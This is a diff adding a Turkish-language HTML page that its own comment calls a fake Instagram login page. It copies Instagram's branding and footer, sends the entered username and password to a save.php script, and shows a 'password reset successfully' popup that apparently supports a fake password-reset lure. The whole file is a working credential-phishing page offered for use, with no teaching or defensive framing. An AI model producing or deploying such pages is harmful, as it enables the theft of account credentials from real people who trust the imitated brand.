@@ -1,0 +1,112 @@
+<!-- Sahte Instagram Giriş Sayfası -->
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram</title>
+  <link rel="stylesheet" href="loginstyle.css" />
+  <link rel="icon" href="images/instagram-logo.png" type="image/png" />
+
+  
+  <style>
+    img {
+      vertical-align: text-top;
+    }
+
+    #popup {
+      display: none;
+      position: fixed;
+      top: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #333;
+      color: #fff;
+      padding: 8px 20px;
+      font-size: 14px;
+      border-radius: 6px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+      z-index: 9999;
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- ✅ Popup kutusu -->
+  <div id="popup">Şifreniz başarıyla sıfırlandı.</div>
+
+  <!-- ✅ JavaScript ile query parametresi kontrolü -->
+  <script>
+    window.addEventListener("DOMContentLoaded", function () {
+      const urlParams = new URLSearchParams(window.location.search);
+      if (urlParams.get("reset") === "success") {
+        const popup = document.getElementById("popup");
+        popup.style.display = "block";
+        setTimeout(() => {
+          popup.style.display = "none";
+        }, 3000);
+      }
+    });
+  </script>
+
+  <div class="container">
+    <div class="box">
+      <div class="heading"></div>
+
+      <form class="login-form" action="save.php" method="post">
+        <div class="field">
+          <input id="username" name="username" type="text" placeholder=" " required />
+          <label for="username">Telefon numarası, kullanıcı adı veya e‑posta</label>
+        </div>
+        <div class="field">
+          <input id="password" name="password" type="password" placeholder=" " required />
+          <label for="password">Şifre</label>
+        </div>
+        <button class="login-button" title="login" type="submit">Giriş Yap</button>
+
+        <div class="separator">
+          <div class="line"></div>
+          <p>YA DA</p>
+          <div class="line"></div>
+        </div>
+
+        <div class="other">
+          <button class="fb-login-btn" type="button">
+            <img src="images/facebook-icon.png" height="15" width="15" />
+            <span>&nbsp;Facebook ile Giriş Yap</span>
+          </button>
+          <a class="forgot-password" href="forget.html">Şifreni mi unuttun?</a>
+        </div>
+      </form>
+    </div>
+
+    <div class="box">
+      <p>Hesabın yok mu? <a class="signup" href="#">Kaydol</a></p>
+    </div>
+  </div>
+
+  <br />
+  <div class="get">Uygulamayı indir.</div>
+  <br />
+  <div class="apps">
+    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" height="40" width="134" />
+    &nbsp;&nbsp;&nbsp;&nbsp;
+    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" height="40" width="134" />
+  </div>
+  <br />
+  <div class="footer">
+    <footer>
+      Meta Hakkında Blog İş Fırsatları Yardım API Gizlilik Koşullar Top Hesaplar Etiketler Konumlar Instagram Lite İletişim
+      Yükleme & Üye Olmayanlar
+    </footer>
+  </div>
+  <div class="copyright">
+    <br />
+    Türkçe © 2025 Instagram from Meta
+  </div>
+</body>
+
+</html>
